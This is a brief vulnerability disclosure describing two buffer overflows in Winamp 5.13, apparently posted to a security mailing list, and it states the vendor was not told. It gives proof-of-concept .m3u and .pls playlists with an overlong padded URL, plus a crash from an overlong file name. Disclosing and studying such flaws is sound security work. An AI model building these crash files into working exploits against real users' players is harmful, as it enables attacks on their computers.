Subject: New winamp m3u/pls .WMA & .M3U Extension overflows


This is an update on.
http://idefense.com/intelligence/vulnerabilities/display.php?id=378

and also a new overflow with .m3u

This overflow is still present in the latest version of winamp 5.13 with a little bit of modifcation.

FIRST VULN
==========

like so..
Example m3U file format:

#EXTM3U
#EXTINF:,VULN
http://AAAA[...]AA.wma

Example pls file format:

[playlist]
numberofentries=5
File1=http://AAAA[...]AA.wma
Title1=
Length5=-1
Version=2

add correct amount of A's untill overflow occurs.

SECOND VULN
============

This one is simple create a file with a long file name like so AAAA[...]AA.m3u save the file and open it and suprise winamp crashes.

=================================================

The vendor has not been contacted on these issues due to past unsuccessfull attempts on other issues and both remain vuln in the latest version of winamp.
